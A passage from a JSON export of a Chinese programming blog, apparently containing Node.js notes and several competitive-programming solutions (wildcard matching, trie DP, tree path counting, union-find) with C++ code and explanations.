Code\\\\bin;C:\\\\Users\\\\v25bh\\\\AppData\\\\Roaming\\\\Composer\\\\vendor\\\\bin;C:\\\\Users\\\\v25bh\\\\AppData\\\\Roaming\\\\npm', PATHEXT: '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL', PhpStorm: 'D:\\\\phpstorm\\\\PhpStorm 2019.2.4\\\\bin;', PROCESSOR_ARCHITECTURE: 'AMD64', PROCESSOR_IDENTIFIER: 'Intel64 Family 6 Model 158 Stepping 10, GenuineIntel', PROCESSOR_LEVEL: '6', PROCESSOR_REVISION: '9e0a', ProgramData: 'C:\\\\ProgramData', ProgramFiles: 'C:\\\\Program Files', 'ProgramFiles(x86)': 'C:\\\\Program Files (x86)', ProgramW6432: 'C:\\\\Program Files', PROMPT: '$P$G', PSModulePath: 'C:\\\\Users\\\\v25bh\\\\Documents\\\\WindowsPowerShell\\\\Modules;C:\\\\Program Files\\\\WindowsPowerShell\\\\Modules;C:\\\\WINDOWS\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\Modules', PUBLIC: 'C:\\\\Users\\\\Public', SESSIONNAME: 'Console', SystemDrive: 'C:', SystemRoot: 'C:\\\\WINDOWS', TEMP: 'C:\\\\Users\\\\v25bh\\\\AppData\\\\Local\\\\Temp', TMP: 'C:\\\\Users\\\\v25bh\\\\AppData\\\\Local\\\\Temp', USERDOMAIN: 'LAPTOP-TLHLP7T6', USERDOMAIN_ROAMINGPROFILE: 'LAPTOP-TLHLP7T6', USERNAME: 'v25bh', USERPROFILE: 'C:\\\\Users\\\\v25bh', VAGRANT_HOME: 'C:\\\\Users\\\\v25bh\\\\.vagrant.d', VBOX_MSI_INSTALL_PATH: 'D:\\\\vitualbox\\\\', VS110COMNTOOLS: 'D:\\\\visual studio express2012\\\\Common7\\\\Tools\\\\', windir: 'C:\\\\WINDOWS'&#125; 退出 1process.exit(number); //number: 提供一个退出代码 ( 可以接在console.error(str);之后 ) 进程信号 1234process.on(&apos;SIGKILL&apos;, function()&#123; //node程序是通过在process对象上以事件分发的形式发送信号 //e.g: SIGKILL是一个进程终止的信号&#125;) ANSI转义码 在文本终端下控制格式，颜色以及其他输出选项 1放个博客总结(https://blog.csdn.net/vivian_wanjin/article/details/82930308) fs的一些接口 1fs.createReadStream('filepath'); 对比： 123456789101112131415161718var fs = require(&apos;fs&apos;);fs.readFile(&apos;file.txt&apos;, function(err, contents) &#123; //do sth console.log(&apos;readFile(): &apos; + contents);&#125;);//分段之后对大文件(日志 / 视频)的处理能力增强var stream = fs.createReadStream(&apos;file.txt&apos;);var data = &apos;&apos;;stream.on(&apos;data&apos;, function(chunk) &#123; //处理一部分内容，例如: data += chunk; data += chunk; console.log(&quot;chunk&quot;);&#125;)stream.on(&apos;end&apos;, function(chunk) &#123; //文件读取完毕 console.log(data + &quot; 最后一截chunk是空的 &quot; + chunk);&#125;) 1fs.watchFile() //监视文件 123456789101112var fs = require('fs');//fs的同步方法var files = fs.readdirSync(process.cwd());files.forEach( function (file) &#123; //寻找以css为后缀的文件，如果更改就输出文件名 if(/\\.css/.test(file)) &#123; //一直运行的检测方法，如果改动就会触发事件 fs.watchFile(process.cwd() + '/' + file, function() &#123; console.log(' - ' + file + ' changed'); &#125;); &#125;&#125;);","tags":[{"name":"node","slug":"node","permalink":"https://v25bh145.github.io/tags/node/"},{"name":"《了不起的Node JS 将JavaScript进行到底》","slug":"《了不起的Node-JS-将JavaScript进行到底》","permalink":"https://v25bh145.github.io/tags/%E3%80%8A%E4%BA%86%E4%B8%8D%E8%B5%B7%E7%9A%84Node-JS-%E5%B0%86JavaScript%E8%BF%9B%E8%A1%8C%E5%88%B0%E5%BA%95%E3%80%8B/"}]},{"title":"Question-P2536","date":"2020-03-02T08:52:34.000Z","path":"2020/03/02/coding/questions/Question-P2536/","text":"题目描述科学家们在Samuel星球上的探险仍在继续。非常幸运的，在Samuel星球的南极附近，探险机器人发现了一个巨大的冰湖！机器人在这个冰湖中搜集到了许多RNA片段运回了实验基地。 科学家们经过几个昼夜的研究，发现这些RNA片段中有许多是未知的病毒！ 每个RNA片段都是由A、C、T、G组成的序列。科学家们也总结出了Samuel星球上的“病毒模版片段”。一个模版片段是由A、C、T、G的序列加上通配符 和 ? 来表示。其中 的意思是可以匹配上0个或任意多个字符，而 ? 的意思是匹配上任意一个字母。 如果一个RNA片段能够和“病毒模版片段”相匹配，那么这个RNA片段就是未知的病毒。 例如，假设“病毒模版片段”为A*G?C。RNA片段：AGTC，AGTGTC都是未知的病毒，而RNA片段AGTGC则不是病毒。 由于，机器人搜集的这些RNA片段中除去病毒的其他部分都具有非常高的研究价值。所以科学家们希望能够分辨出其中哪些RNA片段不是病毒，并将不是病毒的RNA片段运回宇宙空间站继续进行研究。 科学家将这项任务交给了小联。现在请你为小联编写程序统计哪些RNA片段不是病毒。 输入格式第一行有一个字符串，由A、C、T、G、*、? 组成。表示“病毒模版片段”。“病毒模版片段”的长度不超过1000。第二行有一个整数N（0 &lt; N &lt; 500），表示机器人搜集到的RNA片段的数目。随后的N行，每一行有一个字符串，由A、C、T、G组成，表示一个RNA片段。每个RNA片段的长度不超过500。注意：“病毒模版片段”和RNA片段的长度都至少为1。 输出格式只有一行输出，为整数M，即不是病毒的RNA片段的数目。 输入输出样例输入 #1A*G?C 3 AGTC AGTGTC AGTGC 输出 #11 说明/提示输入中的RNA片段AGTGC不是病毒。 听歌儿 大爱凉风~ 解看似紫题，实则水题 其实只是因为咱发现了独特的解法 一看数据范围，哇，500 (wushiling wwwww) 这次应该打暴力了 *用于分割字符串，那咱干脆就把字符串分开算了： 建立字符串的一维数组和一个处理数据的临时字符栈，扫描输入的字符串，见到字符就放到栈里，见到*就全部出栈，放到字符串数组下标len的字符串里，然后len++ 当然咱还得处理俩特殊情况： *开头 *连续出现，中间没有字符分割 这俩情况咱if特判一下就好啦 然后就该读入测试数据了： 咱就让每个测试字符串依次通过目标字符串们(目标字符串由*断开)的审核，如果通过了就消掉前面通过的部分，如果没通过就出来，不匹配 同时这种测试可以贪心解决，在同一个测试字符串中对于同一个目标字符串，最先匹配到(这里的先指的是字符顺序优先，咱匹配肯定是按照字符顺序扫描着来的嘛)的必然是最优解(而不是唯一最优解，这里说明) 然后是匹配(每一个目标字符串匹配一次)的问题： 咱可以使用并行来匹配，就像VScode匹配选中的字符一样(没错就是这里给了我灵感) 先过第一个目标字符串的字符，扫描测试字符串里所有的该字符，按优先度(以顺序优先，也同时完成了暗中的贪心必备排序)存上位置 目标字符串里的字符一个一个过，每过一个字符就遍历一遍还在字符串里的字符，判断那个字符的下一个字符是不是这个目标字符串里的字符，是则位置+1，否则踢出数组 最后导致结束的两种情况： 数组空了 目标字符串进行匹配完了 第一种情况则匹配失败，第二种情况则匹配成功，取最前面完成匹配的数组的位置(也就是位置存值最小的地方)，断掉之前的所有元素，继续换下一个目标字符串进行 很完美的解法咯，最后我想到数组可以换成链表就可以解决删除数组元素复杂度太大的问题了，这里就变成了线性复杂度而非平方(ps：可惜写链表老是RE错误，暴力数组却过了所以这里的优化也许是没有必要的哈哈哈哈哈哈) 代码//Madoka daisuki!!! #include&lt;bits/stdc++.h&gt; using namespace std; int n, dictLen = 0, dictLenSingle[1000], ans = 0; char sAll[1050]; char stmp[505]; char dict[1050][1050]; //根据*来划分目标字符串 void Build() { int len = strlen(sAll), tmpl = 0; for(int i = 0; i &lt; len; i++) { //这俩if就是特判啦 if(i == 0 &amp;&amp; sAll[i] == &#39;*&#39;) continue; if(sAll[i] == &#39;*&#39; &amp;&amp; sAll[i - 1] == &#39;*&#39;) continue; if(sAll[i] != &#39;*&#39;) dict[dictLen][tmpl++] = sAll[i]; else { dictLenSingle[dictLen++] = tmpl; tmpl = 0; } } if(tmpl != 0) { dictLenSingle[dictLen++] = tmpl; tmpl = 0; } } //对应一个测试字符串和目标字符串数组(目标字符串们) int Exam(char tmps[], int k, int st, int ed) { //你瞧这暴力的开空间 int* pos = new int[ed - st + 1]; int posLen = 0, res = ed; for(int i = 0; i &lt; ed - st + 1; i++) pos[i] = 0; for(int i = 0; i &lt; dictLenSingle[k]; i++) { if(i == 0) { for(int j = st; j &lt; ed - dictLenSingle[k] + 1; j++) if(tmps[j] == dict[k][0] || dict[k][0] == &#39;?&#39;) pos[posLen++] = j; continue; } for(int j = 0; j &lt; posLen; j++) if(pos[j] != -1) { if(tmps[pos[j] + 1] == dict[k][i] || dict[k][i] == &#39;?&#39;) pos[j]++; //你瞧这暴力的置空 else pos[j] = -1; } } for(int i = 0; i &lt; posLen; i++) if(pos[i] != -1) //你瞧这暴力的判定 res = res &lt; pos[i] ? res : pos[i]; return res; } bool Judge(char tmps[]) { int st = 0, ed = strlen(tmps); for(int i = 0; i &lt; dictLen; i++) { st = Exam(tmps, i, st, ed); if(st == ed) return false; } return true; } int main() { scanf(&quot;%s&quot;, sAll); Build(); scanf(&quot;%d&quot;, &amp;n); for(int i = 1; i &lt;= n; i++) { scanf(&quot;%s&quot;, stmp); if(!Judge(stmp)) ans++; } printf(&quot;%d&quot;, ans); } 时间复杂度分析我用的是数组嘛，但是我把那里的时间复杂度也缩短到了线性,因为我在删除的时候根本没有移位 (就是常数远远大于链表哈哈哈) 前面构建目标数组们： O( N_{目标字符串们的总长} ) (N < 1000) 后面单个个测试字符串的测试时间： O( N_{分隔符的个数} * ( N_{目前测试字符串长度} + N_{这个目标字符串长度} * N_{第一个目标字符匹配到相等的测试字符的数量} ) ) 俩一加，得到： O( N_{分隔符的个数} * ( N_{目前测试字符串长度} + N_{这个目标字符串长度} * N_{第一个目标字符匹配到相等的测试字符的数量} ) )= O( N_{分隔符的个数} * N_{目前测试字符串长度} + N_{分隔符的个数} * N_{这个目标字符串长度} * N_{第一个目标字符匹配到相等的测试字符的数量} )= O( N_{分隔符的个数} * N_{目前测试字符串长度} + N_{目标字符串们的总长} * N_{第一个目标字符匹配到相等的测试字符的数量} ) 按照随机的原则: N_{第一个目标字符匹配到相等的测试字符的数量} \\approx N_{一个测试字符串长度} / 4 最后乘上个测试字符串的个数： O( N_{目标字符串们的总长} * N_{一个测试字符串长度} * N_{测试字符串的个数} )差不多就是 1000 500 500，2.5E8是够的，实际的数字比这个小好多(有除以4呢) 如果我们用链表，那么常数就更小更小咯，不过这已经足够了 (为什么我动态链表RE了！QAQ)","tags":[{"name":"Question","slug":"Question","permalink":"https://v25bh145.github.io/tags/Question/"},{"name":"暴力","slug":"暴力","permalink":"https://v25bh145.github.io/tags/%E6%9A%B4%E5%8A%9B/"}]},{"title":"Question-P2292","date":"2020-02-27T12:44:53.000Z","path":"2020/02/27/coding/questions/Question-P2292/","text":"P2292题目描述标点符号的出现晚于文字的出现，所以以前的语言都是没有标点的。现在你要处理的就是一段没有标点的文章。 一段文章T是由若干小写字母构成。一个单词W也是由若干小写字母构成。一个字典D是若干个单词的集合。我们称一段文章T在某个字典D下是可以被理解的，是指如果文章T可以被分成若干部分，且每一个部分都是字典D中的单词。 例如字典D中包括单词{‘is’, ‘name’, ‘what’, ‘your’}，则文章‘whatisyourname’是在字典D下可以被理解的，因为它可以分成4个单词：‘what’, ‘is’, ‘your’, ‘name’，且每个单词都属于字典D，而文章‘whatisyouname’在字典D下不能被理解，但可以在字典D’=D+{‘you’}下被理解。这段文章的一个前缀‘whatis’，也可以在字典D下被理解，而且是在字典D下能够被理解的最长的前缀。 给定一个字典D，你的程序需要判断若干段文章在字典D下是否能够被理解。并给出其在字典D下能够被理解的最长前缀的位置。 输入格式输入文件第一行是两个正整数n和m，表示字典D中有n个单词，且有m段文章需要被处理。之后的n行每行描述一个单词，再之后的m行每行描述一段文章。 其中1&lt;=n, m&lt;=20，每个单词长度不超过10，每段文章长度不超过1M。 输出格式对于输入的每一段文章，你需要输出这段文章在字典D可以被理解的最长前缀的位置。 输入输出样例输入 #1复制4 3isnamewhatyourwhatisyournamewhatisyounamewhaisyourname 输出 #1复制14 （整段文章’whatisyourname’都能被理解）6 （前缀’whatis’能够被理解）0 （没有任何前缀能够被理解） 听音乐 解一个非常有意思的字符串问题 (这道题有个有趣的灵魂) 从单词和小写来看，这题一定是需要建立字典树的，之后怎么办呢？ 错解我们可以针对字符文本来创一个栈，逐字扫描入栈，如果栈里的字符构成了个单词，就全部请出去继续扫描，如果栈里的字符长于字典树匹配的最长单词，这段文字就不可翻译 但是这样做会出现个问题：目前选择的单词并不是最优解 何来此言？举个例子： 就拿测试数据举例子： 4 3 whatis what your name whatisyourname 我们如果单纯进行扫描入栈的操作，会在进行到what这儿判定为一个单词，请出栈，然后i打头莫得单词，直接判定为不可翻译 所以这样的线性算法是行不通的 等等，你刚刚说了最优解对吧？！！ 正解我们需要一个最优选择，使得我们可以完美选择字典的单词来翻译 反转思维来考虑这种问题，已知前面的文段已经被正确翻译，如何来解下面的翻译问题？ 思路1 -dfs我们需要遍历所有这个字符的单词，判定这个字符能达到哪些单词，然后再从这个字符的下一个字符出发，看能达到哪些单词，如果有成功达到终点的单词，就结束 思路2 -动态规划我们可以依次遍历这个文本，如果字符可以达到就遍历这个字符的下个字符开头的所有单词，将能达到的点设为可以达到状态，然后继续扫描 (只要能到达那个地方) 代码//Madoka daisuki!!! #include&lt;bits/stdc++.h&gt; using namespace std; int root = 0, length = 1, n, m; struct TrieNode { int child[26]; bool isWord; }tree[2200]; inline void Add(string s) //添加单词到字典 { int x = root; for(int i = 0; i &lt; s.length(); i++) { if(tree[x].child[s[i] - &#39;a&#39;] == 0) { length++; tree[x].child[s[i] - &#39;a&#39;] = length; } x = tree[x].child[s[i] - &#39;a&#39;]; } tree[x].isWord = true; } char tmpWord[15], tmpText[1000050]; string tmpS; int maxLen; bool canReach[1000050]; inline void Find(string text) //重头戏来了：动态规划的扫描 { //进行初始化 maxLen = -1; for(int i = 0; i &lt; text.length(); i++) canReach[i] = false; //初始化第一个字符能达到的点 for(int i = 0, x = root; i &lt; text.length(); i++) { if(tree[x].child[text[i] - &#39;a&#39;] == 0) break; x = tree[x].child[text[i] - &#39;a&#39;]; if(tree[x].isWord) canReach[i] = true; } //沿着字符扫描文本 for(int i = 0; i &lt; text.length(); i++) { //走不到就溜 if(!canReach[i]) continue; //走到了就遍历以下一个字符开头能到达的所有点 //放到字典树就是遍历一遍那条边，如果是个单词就设置为可以达到 maxLen = i; for(int j = i + 1, x = root; j &lt; text.length(); j++) { if(tree[x].child[text[j] - &#39;a&#39;] == 0) break; x = tree[x].child[text[j] - &#39;a&#39;]; if(tree[x].isWord) canReach[j] = true; } } } int main() { scanf(&quot;%d%d&quot;, &amp;n, &amp;m); for(int i = 1; i &lt;= n; i++) { scanf(&quot;%s&quot;, tmpWord); tmpS = string(tmpWord); Add(tmpS); } for(int i = 1; i &lt;= m; i++) { scanf(&quot;%s&quot;, tmpText); tmpS = string(tmpText); Find(tmpS); printf(&quot;%d\\n&quot;, maxLen + 1); } } 最后动态规划具有最优子结构和无后效性 一开始我居然使用的是dfs，失误失误QAQ (果然我对动态规划还是理解不深呢) (逃)","tags":[{"name":"动态规划","slug":"动态规划","permalink":"https://v25bh145.github.io/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"},{"name":"Question","slug":"Question","permalink":"https://v25bh145.github.io/tags/Question/"},{"name":"字典树","slug":"字典树","permalink":"https://v25bh145.github.io/tags/%E5%AD%97%E5%85%B8%E6%A0%91/"}]},{"title":"Question-CF979C","date":"2020-02-19T08:10:24.000Z","path":"2020/02/19/coding/questions/Question-CF979C/","text":"CF979C Kuro and Walking Route题目描述Kuro is living in a country called Uberland, consisting of n towns, numbered from 1 to n , and n - 1 bidirectional roads connecting these towns. It is possible to reach each town from any other. Each road connects two towns a and b . Kuro loves walking and he is planning to take a walking marathon, in which he will choose a pair of towns (u, v) (u != v)​ and walk from uu using the shortest path to v (note that (u, v) is considered to be different from (v, u) . Oddly, there are 2 special towns in Uberland named Flowrisa (denoted with the index x ) and Beetopia (denoted with the index y ). Flowrisa is a town where there are many strong-scent flowers, and Beetopia is another town where many bees live. In particular, Kuro will avoid any pair of towns (u, v) if on the path from u to v , he reaches Beetopia after he reached Flowrisa, since the bees will be attracted with the flower smell on Kuro’s body and sting him. Kuro wants to know how many pair of city (u, v) he can take as his route. Since he’s not really bright, he asked you to help him with this problem. 输入格式The first line contains three integers n ($1 &lt;= n &lt;= 3 * 10 ^ {5}$) , x and y ($1 &lt;= x,y &lt;= n$)- the number of towns, index of the town Flowrisa and index of the town Beetopia, respectively. n - 1lines follow, each line contains two integers a and b​, describes a road connecting two towns a and b . It is guaranteed that from each town, we can reach every other town in the city using the given roads. That is, the given map of towns and roads is a tree. 输出格式A single integer resembles the number of pair of towns (u, v) that Kuro can use as his walking route. 题意翻译n 个结点，编号从 1 到 n ， n−1 条双向边的连通图，问图中有多少点对 (u,v) 使得从 u 到 v 的最短路上，不存在先到达 x ，再到达 y 的情况。点对 (u,v) 与点对 (v,u) 被认为是不同的。 听歌 解分析n个节点，n - 1条边，每一个节点都有边与之相连，可以判断出来是一棵树 我们可以利用容斥把题的意思翻转一下，点之间的最短路径总数(n * n - n) = 先到x再到y的情况 + 不是先到x再到y的情况因此题意就变成了 求两点之间的最短路径中，先到x再到y的情况 模拟我们先画一个简单的树出来 设起始点是3，终点是5，3到5的最短路径是 3 -&gt; 4 -&gt; 5 我们可以由起点和终点把树划分为三个点集 第一个集包含了由起点到终点的最短路径中所经过的点(不包含起始和终点)第二个集包含了起点，集合内的点互相联通且与第一个集的交集为空第三个集包含了终点，集合内的点互相联通且与第一个集的交集为空 举个例子，图中第一个集合就是4，第二个集合就是1, 2, 3，第三个集合就是5, 6, 7 可以看出来，先到x再到y的最短路径的总和 = 第二个集合的基数 * 第三个集合的基数 算法思路这就好做多了，我们可以两边dfs分别求集合。 这里我们依然采用容斥 第一次dfs 我们可算出第一个集合与第二个集合的基数之和(从起点dfs，终止条件是 vis1[n] 或 n == ed) 第二次dfs 我们可算出第三个集合的基数与第二个集合的基数(从终点dfs，终止条件是vis2[n]或 n == st) 另外： 当遍历到的点属于第一次dfs的点的集合时 (确切的说，是处于第一集合与第二集合的并集中，且由于遍历以起始点作为终点，所以我们不会遍历到第一集合的点，所以结论是这些点就属于第二集合的点，且这些点的集合就是第二集合) ，我们可以用第一次计算到的基数之和减去这些点的集合的基数，得到的就是第一集合的基数 当遍历到的点不属于第一次dfs的点的集合时，这个点就属于第三集合，且这些点的集合就是第三集合 用图来解释一下： 代码//Madoka daisuki!!! #include&lt;bits/stdc++.h&gt; #define N 300050 using namespace std; int h[N], n, st, ed, length; long long ans, cnt1 = 0, cnt2 = 0; bool vis1[N], vis2[N]; struct Edge { int next, to; }edge[2 * N];//要注意啊，无向图装配两次所以要开两倍qwq void Equip(int x, int y) { length++; edge[length].to = y; edge[length].next = h[x]; h[x] = length; } void dfs1(int x) { if(vis1[x] || x == ed) return; cnt1++; vis1[x] = true; for(int e = h[x]; e; e = edge[e].next) if(!vis1[edge[e].to]) dfs1(edge[e].to); } void dfs2(int x) { if(vis2[x] || x == st) return; if(vis1[x]) cnt1--; else cnt2++; vis2[x] = true; for(int e = h[x]; e; e = edge[e].next) if(!vis2[edge[e].to]) dfs2(edge[e].to); } int main() { scanf(&quot;%d%d%d&quot;, &amp;n, &amp;st, &amp;ed); ans = 1ll * n * n - n; //1ll :表示数据类型为long long，数据值为1的常量 int tmp1, tmp2; for(int i = 1; i &lt;= n - 1; i++) { scanf(&quot;%d%d&quot;, &amp;tmp1, &amp;tmp2); Equip(tmp1, tmp2); Equip(tmp2, tmp1); } dfs1(st); dfs2(ed); ans -= cnt1 * cnt2; printf(&quot;%lld&quot;, ans); } #虽然是好简单一道题但是还是为了写写容斥而且英文题看着好装逼啊虽然看着翻译做的哈哈哈哈就放上来了哈哈哈哈哈哈","tags":[{"name":"容斥","slug":"容斥","permalink":"https://v25bh145.github.io/tags/%E5%AE%B9%E6%96%A5/"},{"name":"搜索","slug":"搜索","permalink":"https://v25bh145.github.io/tags/%E6%90%9C%E7%B4%A2/"}]},{"title":"Question-P1197","date":"2020-02-16T07:39:35.000Z","path":"2020/02/16/coding/questions/Question-P1197/","text":"P1197题目描述很久以前，在一个遥远的星系，一个黑暗的帝国靠着它的超级武器统治着整个星系。 某一天，凭着一个偶然的机遇，一支反抗军摧毁了帝国的超级武器，并攻下了星系中几乎所有的星球。这些星球通过特殊的以太隧道互相直接或间接地连接。 但好景不长，很快帝国又重新造出了他的超级武器。凭借这超级武器的力量，帝国开始有计划地摧毁反抗军占领的星球。由于星球的不断被摧毁，两个星球之间的通讯通道也开始不可靠起来。 现在，反抗军首领交给你一个任务：给出原来两个星球之间的以太隧道连通情况以及帝国打击的星球顺序，以尽量快的速度求出每一次打击之后反抗军占据的星球的连通块的个数。（如果两个星球可以通过现存的以太通道直接或间接地连通，则这两个星球在同一个连通块中）。 输入格式输入文件第一行包含两个整数，n, m，分别表示星球的数目和以太隧道的数目。星球用 0 ∼ n−1 的整数编号。 接下来的 m 行，每行包括两个整数 x,y，表示星球 x 和星球 y 之间有 “以太” 隧道，可以直接通讯。 接下来的一行为一个整数 k ，表示将遭受攻击的星球的数目。 接下来的 k 行，每行有一个整数，按照顺序列出了帝国军的攻击目标。这 k 个数互不相同，且都在 0 到 n-1 的范围内。 输出格式第一行是开始时星球的连通块个数。接下来的 k 行，每行一个整数，表示经过该次打击后现存星球的连通块个数。 输入输出样例输入8 13 0 1 1 6 6 5 5 0 0 6 1 2 2 3 3 4 4 5 7 1 7 2 7 6 3 6 5 1 6 3 5 7 输出1 1 1 2 3 3 说明/提示【数据范围】对于 100% 的数据，1 &lt; m &lt; $2*10^{5}$ , 1 &lt; n &lt; 2m (JSOI2008) 听歌 白箱真好看 解首先想到的是动态的并查集，允许删除操作，在毁灭星球的时候删除依赖这个星球交互的行星，但是并查集只支持一个无序集合，并没有支持元素之间联系的线段 看来只剩更改并查集这个数据结构了？ 在毁灭星球的时候，星球之间的边也随之毁灭，我们需要记下来每个星球的边，考虑到是个稀疏图，可以用邻接表存边 然后我们需要根据边数实时建立起多个集合，实在是太麻烦了 然后把思维逆转一下，不用“实时”的操作，也就是offline操作，可以把“毁灭”变为“建立”，也就可以使用并查集动态从后向前维护了 具体思路是这样子： 将没有被(不会被)毁灭的行星放到一个并查集 —初始化操作 倒序录入已经毁灭的行星与已经毁灭的行星与未被毁灭的行星的关系 将集合的个数作为结果存入那一次毁灭之前的答案中 ps: 集合的个数可以用并查集中的边数表示，算法类似于最小生成树kruskal 当然输出的结果是倒序，我们还需要存储个结果，反向输出 代码//Madoka daisuki!!! #include&lt;bits/stdc++.h&gt; #define N 400050 #define M 200050 using namespace std; int n, m, h[N], km = 0, arrayK[N], k, current = 0, ans[N], father[N]; bool del[N]; //并查集素质三连 int Find(int x) { if(father[x] != x) father[x] = Find(father[x]); return father[x]; } void Union(int x, int y){father[Find(x)] = Find(father[y]);} bool Judge(int x, int y){return Find(x) == Find(y);} //前向星存图 struct Edge{int toN, nextE, fromN;}edge[2 * M]; void Equip(int x, int y) { km++; edge[km].nextE = h[x]; edge[km].toN = y; h[x] = km; edge[km].fromN = x; } int main() { scanf(&quot;%d%d&quot;, &amp;n, &amp;m); int a, b; for(int i = 0; i &lt; n; i++) father[i] = i; for(int i = 1; i &lt;= m; i++) { scanf(&quot;%d%d&quot;, &amp;a, &amp;b); Equip(a, b); Equip(b, a); } scanf(&quot;%d&quot;, &amp;k); for(int i = 1; i &lt;= k; i++) { scanf(&quot;%d&quot;, &amp;a); arrayK[i] = a; del[a] = true; } /* 当然初始化也有两种思路 * 遍历点，如果星球不会被毁灭，则搜索与之相连的边，如果连接到的星球也不会被毁灭，则合并集合 * 事实证明，这种方法的效率更快 */ for(int i = 0; i &lt; n; i++) { if(!del[i]) { current++; for(int t = h[i]; t; t = edge[t].nextE) { if(!del[edge[t].toN] &amp;&amp; !Judge(i, edge[t].toN)) { Union(i, edge[t].toN); current--; } } } } // 遍历边，如果两边的星球都不会被毁灭，则合并两星球 /* current = n - k; for(int i = 1; i &lt;= 2 * m; i++) { if(!del[edge[i].fromN] &amp;&amp; !del[edge[i].toN] &amp;&amp; !Judge(edge[i].fromN, edge[i].toN)) { current--; Union(edge[i].fromN, edge[i].toN); } }*/ ans[k] = current; for(int i = k; i &gt;= 1; i--) { current++; del[arrayK[i]] = false; for(int t = h[arrayK[i]]; t; t = edge[t].nextE) { if(!del[edge[t].toN] &amp;&amp; !Judge(arrayK[i], edge[t].toN)) { Union(arrayK[i], edge[t].toN); current--; } } ans[i - 1] = current; } for(int i = 0; i &lt;= k; i++) printf(&quot;%d\\n&quot;, ans[i]); } 后续说起来你可能不信，我调了半个下午最后才发现我并查集路径压缩写错了","tags":[{"name":"Question","slug":"Question","permalink":"https://v25bh145.github.io/tags/Question/"},{"name":"并查集","slug":"并查集","permalink":"https://v25bh145.github.io/tags/%E5%B9%B6%E6%9F%A5%E9%9B%86/"}]},{"title":"Question-P2024","date":"2020-02-08T07:19:10.000Z","path":"2020/02/08/coding/questions/Question-P2024/","text":"P2024 [NOI2001]食物链题目描述动物王国中有三类动物 A,B,C，这三类动物的食物链构成了有趣的环形。A 吃 B，B 吃 C，C 吃 A。 现有 N 个动物，以 1 － N 编号。每个动物都是 A,B,C 中的一种，但是我们并不知道 它到底是哪一种。 有人用两种说法对这 N 个动物所构成的食物链关系进行描述： 第一种说法是“1 X Y”，表示 X 和 Y 是同类。 第二种说法是“2 X Y”，表示 X 吃 Y 。 此人对 N 个动物，用上述两种说法，一句接一句地说出 K 句话，这 K 句话有的是真 的，有的是假的。当一句话满足下列三条之一时，这句话就是假话，否则就是真话。 • 当前的话与前面的某些真的话冲突，就是假话 • 当前的话中 X 或 Y 比 N 大，就是假话 • 当前的话表示 X 吃 X，就是假话 你的任务是根据给定的 N 和 K 句话，输出假话的总数。 输入格式从 eat.in 中输入数据 第一行两个整数，N，K，表示有 N 个动物，K 句话。 第二行开始每行一句话（按照题目要求，见样例） 输出格式输出到 eat.out 中 一行，一个整数，表示假话的总数。 输入输出样例输入 #1100 7 1 101 1 2 1 2 2 2 3 2 3 3 1 1 3 2 3 1 1 5 5 输出 #13 说明/提示1 ≤ N ≤ 5 ∗ 10^4 1 ≤ K ≤ 10^5 音乐 解首先，所有动物都可以被分为三类，或者说三个集合，可以考虑用并查集处理 这三个集合之间还有逻辑关系存在，是一个环形的食物链，我们可以直接想到用环形的链表去模拟，链表的节点就是并查集的祖宗， 为了简便，我们称中间的链表的上行为父，下行为子 之后有k句话，非假即真，我们需要先判断话语是否为假，不为假就是真的，即存储这个事实 之后需要考虑的东西： 如何去维护一个环形的链表？ 如何去判断这一句话是否为假？ 问题 #1首先考虑维护一个链表的连通性 在一个链表的 节点数&lt;3 时，使其不闭合，而当其 节点数=3 时，使其闭合，当 节点数&gt;3 时，使闭合链表的同时合并集合，将 第k节点 与 第k+3节点 合并 当两个链表合成的时候，我们需要对其中的集合进行合并，同时也要注意到需要维护 节点是祖宗 的性质 更具体的，输入 1 x y 时，在判断不为假之后，我们对两个链表合并，我们将左链表节点代表的集合的祖宗视为合并后节点上的代表祖宗，如果左链表无父/子，则补上右链表的节点代表的集合的祖宗为合并后节点上的代表祖宗，之后判断连通性即可(换句话说，有左边就左边为祖宗，左边没有就用右边) 输入 2 x y时，在判断不为假之后，我们对两个链表错位合并，如果左链表的节点有子，则执行1 x.son y，如果左链表的节点无子， 右链表的节点有父，则执行1 x y.fat,当左无子，右无父之后，合并右子与左父(如果都有的话)，之后直接使得左为右父，右为左子，判断连通性即可 问题 #2判断一句话是否为假，我们直接找出值在集合中的祖宗，在对应链表上查找即可 代码//Madoka daisuki!!! #include&lt;bits/stdc++.h&gt; #define K 100500 #define N 60050 using namespace std; int n, k, father[N]; //并查集素质三连 inline int Find(int x) { if(x != father[x]) father[x] = Find(father[x]); return father[x]; } inline void Union(int x, int y) { father[Find(y)] = Find(father[x]); } inline bool Judge(int x, int y) { return Find(x) == Find(y); } //链表 struct Link { int f, s; }l[N]; //判断连通性 inline void Connect(int xRoot)//BUG: ³É»·Ö®ºó»¹ÐèÒªÖ´ÐÐÒ»±éÎÞÒâÒåµÄ { if(l[xRoot].s != xRoot &amp;&amp; l[l[xRoot].s].s != l[xRoot].s) { l[xRoot].f = l[l[xRoot].s].s; l[l[l[xRoot].s].s].s = xRoot; } else if(l[xRoot].f != xRoot &amp;&amp; l[xRoot].s != xRoot) { l[l[xRoot].f].f = l[xRoot].s; l[l[xRoot].s].s = l[xRoot].f; } else if(l[xRoot].f != xRoot &amp;&amp; l[l[xRoot].f].f != l[xRoot].f) { l[xRoot].s = l[l[xRoot].f].f; l[l[l[xRoot].f].f].f = xRoot; } } //合并两个链表 inline void UnionLink(int x, int y) { int xRoot = Find(x), yRoot = Find(y); if(xRoot == yRoot) return; if(l[yRoot].f != yRoot) { if(l[xRoot].f != xRoot) Union(l[xRoot].f, l[yRoot].f); else { l[xRoot].f = l[yRoot].f; l[l[xRoot].f].s = xRoot; } } if(l[yRoot].s != yRoot) { if(l[xRoot].s != xRoot) Union(l[xRoot].s, l[yRoot].s); else { l[xRoot].s = l[yRoot].s; l[l[xRoot].s].f = xRoot; } } Union(xRoot, yRoot); l[l[xRoot].s].s = l[xRoot].s; l[l[xRoot].f].f = l[xRoot].f; Connect(xRoot); } //判断是否相等(处于同一个集合) inline bool Equal(int x, int y) { x = Find(x); y = Find(y); bool res = true; if(l[x].f == y || l[x].f == l[y].s) res = false; else if(x == l[y].f || x == l[y].s) res = false; else if(l[x].s == l[y].f || l[x].s == y) res = false; if(res) { UnionLink(x, y); return true; } else return false; } //判断是否为捕食关系(处于链表上的两个父子关系集合) inline bool BeEaten(int x, 